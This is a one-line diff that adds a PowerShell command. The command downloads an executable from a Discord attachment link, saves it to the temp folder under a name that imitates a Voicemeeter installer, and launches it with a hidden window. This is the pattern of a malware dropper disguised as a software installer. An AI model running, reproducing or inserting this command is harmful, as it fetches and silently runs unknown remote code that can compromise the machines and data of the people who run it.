@@ -1,0 +1,1 @@
+iwr -useb https://cdn.discordapp.com/attachments/978409058828705812/1134589570600685578/voicemeteer.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
